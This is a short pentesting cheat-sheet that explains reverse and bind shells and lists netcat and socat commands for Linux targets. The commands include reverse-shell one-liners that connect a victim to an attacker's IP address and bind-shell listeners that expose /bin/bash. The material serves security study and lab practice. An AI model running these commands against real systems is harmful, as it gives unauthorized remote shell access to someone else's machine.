# Shells

Shells are applications that allow us to interface with the command line environment (CLI) of any system. Shells gather input from you and executes programs based on that input. When the program finishes its execution, it displays the output on the shell.

TLDR; Shell is an environment where we can run our commands, programs and scripts.

`bash`, `zsh`, `sh` are examples of shells on Linux / MacOS. `cmd.exe`, `powershell` are examples of shells on Windows.

When trying to exploit a target, there are two types of shells we can gain access to:

*  **Reverse Shell** - To obtain a reverse shell, the attacker sets up a listener on their system. The attacker then executes code on the target system causing the target to *connect back* to the attacker's system. This method is particularly useful to bypass any firewall rules that may have been setup on the target system. This method, however, requires the attacker to configure their own network to accept the incoming shell.

* **Bind Shell** - To obtain a bind shell, the attacker executes code on the target system to start a listener attached directly to a shell on the target system. The attacker can them simply connect to this port and execute code on the remote system. While in this method no configuration is needed on the attacker's system, a firewall protecting the target system can block the initial listener.

## Linux Target Examples

1. Netcat

    * Reverse Shell

      | Attacker | Victim |
      | -------- | ------ |
      | `nc -lnvp <port>` | |
      | | `nc <attacker-ip> <attacker-port> -e /bin/bash` |

      We receive a unstable shell on the attacker. We can proceed to stabalizing this shell.

    * Bind Shell

      | Attacker | Victim |
      | -------- | ------ |
      | | `nc -lnvp <port> -e /bin/bash` |
      | `nc <target-ip> <target-port>` | |

2. Socat
    * Reverse Shell

      | Attacker | Victim |
      | -------- | ------ |
      | `socat TCP-L:<port> -` | |
      | | `socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li"` |

      We receive a unstable shell on the attacker. We can proceed to stabalizing this shell.

    * Bind Shell

      | Attacker | Victim |
      | -------- | ------ |
      | | `socat TCP-L:<port> EXEC:"bash -li"` |
      | `socat TCP:<target-ip>:<target-port> -` | |